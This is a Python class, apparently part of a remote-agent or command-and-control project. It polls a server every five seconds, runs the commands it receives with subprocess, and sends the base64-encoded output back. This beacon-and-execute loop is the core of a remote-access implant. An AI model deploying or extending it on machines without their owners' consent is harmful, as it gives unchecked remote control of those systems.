import threading
import time
import base64
import subprocess
import shlex


class Commander(object):
    def __init__(self, server):
        self._server = server
        self._thread = threading.Thread(target=self.execute)

    def run(self):
        # Handles running in a thread
        self._thread.start()

        # Another test
    #base64 encode and decode over http using 64 characters of the keyboard much cheaper than hexa encoding
    def execute(self):
        while True:
            time.sleep(5)
            response = self._server.communicator.query_commands()
            commands = response["commands"]
            if commands:
                for command in commands:
                    print("RECEVIED COMMAND", command)

                    try:
                        proc = subprocess.Popen(shlex.split(command["command"]), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        out, err = proc.communicate()
                        results = dict(
                            success=True,
                            output=base64.b64encode(out).decode("ascii"),
                            error=base64.b64encode(err).decode("ascii"),
                            code=proc.returncode
                        )
                    except:
                        results = dict(
                            success=False,
                            output=None,
                            error=None,
                            code=None
                        )

                    self._server.communicator.send_command_results(command["id"], results)


